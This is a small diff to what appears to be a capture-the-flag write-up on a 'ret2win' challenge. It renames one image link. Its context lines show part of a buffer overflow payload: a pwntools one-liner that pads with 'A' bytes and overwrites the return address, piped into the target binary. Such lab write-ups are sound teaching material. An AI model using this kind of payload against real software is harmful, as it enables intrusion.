@@ -66,4 +66,4 @@ $ python3 -c 'from pwn import *; print("A"*40 + "\x3e\x05\x40\x00\x00\x00\x00\x0
 ' | ./ret2win
 ```
 
-![](photos/final-pwnn.png)
+![](photos/final-pwn.png)
